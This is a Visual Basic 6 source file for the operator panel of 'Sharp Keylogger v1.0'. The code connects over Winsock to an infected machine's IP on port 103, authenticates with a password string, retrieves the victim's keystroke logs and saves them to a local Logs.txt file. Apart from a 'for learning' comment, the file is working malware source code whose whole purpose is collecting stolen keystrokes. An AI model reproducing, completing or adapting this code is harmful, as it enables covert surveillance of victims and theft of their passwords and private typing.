VERSION 5.00
Begin VB.Form Form3 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Sharp Keylogger Ver 1.0 - Logs Giver"
   ClientHeight    =   5985
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   4680
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5985
   ScaleWidth      =   4680
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox w 
      Height          =   480
      Left            =   120
      ScaleHeight     =   420
      ScaleWidth      =   1500
      TabIndex        =   7
      Top             =   5400
      Width           =   1560
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Save And Clear"
      Height          =   480
      Left            =   1800
      TabIndex        =   6
      Top             =   5400
      Width           =   2775
   End
   Begin VB.TextBox logs 
      Height          =   4455
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   5
      Top             =   840
      Width           =   4455
   End
   Begin VB.TextBox pass 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   960
      TabIndex        =   4
      Text            =   "Sharp v1.0 By Sharp Soft"
      Top             =   500
      Width           =   2295
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Get Logs"
      Height          =   645
      Left            =   3360
      TabIndex        =   2
      Top             =   120
      Width           =   1215
   End
   Begin VB.TextBox ip 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   960
      TabIndex        =   1
      Text            =   "169.254.25.129"
      Top             =   120
      Width           =   2295
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Pass :"
      ForeColor       =   &H000000FF&
      Height          =   195
      Left            =   120
      TabIndex        =   3
      Top             =   520
      Width           =   435
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Server IP :"
      ForeColor       =   &H000000FF&
      Height          =   195
      Left            =   120
      TabIndex        =   0
      Top             =   150
      Width           =   750
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Sharp Keylogger v1.0
'This Keyloger Source Only For Learning
'Coded By : Sharp Soft
'----------------------------
'Y! ID : Sharp_h2001
'Msn ! : Sharp.Soft
'Email : Sharp.Secure@Gmail.Com
'----------------------------
'wWw.Sharp-Soft.nEt
'wWw.Sharp.Blogfa.cOm
'----------------------------


Private Sub Command1_Click()
On Error GoTo a:
w.Close
w.Connect ip.Text, 103
Exit Sub
a:
MsgBox Err.Description, vbCritical, "Error"
End Sub

Private Sub Command2_Click()
On Error GoTo a:
Open "Logs.txt" For Append As #1
    Put #1, , logs.Text
Close #1
MsgBox "File saved in " & App.Path & "\Logs.txt", vbInformation, "Saved ..."
logs.Text = ""
Exit Sub
a:
Close #1
MsgBox Err.Description, vbCritical, "Error"
End Sub

Private Sub Form_Unload(Cancel As Integer)
Cancel = 1
w.Close
Close #1
Form1.Show
Unload Me
Hide
End Sub

Private Sub logs_Change()
logs.SelLength = Len(logs.Text)
End Sub

Private Sub w_Close()
w.Close
End Sub

Private Sub w_Connect()
Me.Caption = "Sharp Keylogger v1.0 - Connected"
w.SendData "GET," & pass.Text
End Sub

Private Sub w_ConnectionRequest(ByVal requestID As Long)
w.Close
w.Accept requestID
End Sub

Private Sub w_DataArrival(ByVal bytesTotal As Long)
Dim a As String
w.GetData a, vbString
If Left(a, 2) = "L:" Then a = Right(a, Len(a) - 2): logs.Text = "": logs.Text = a
End Sub

Private Sub w_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
w.Close
MsgBox Description, vbCritical, "Error"
End Sub
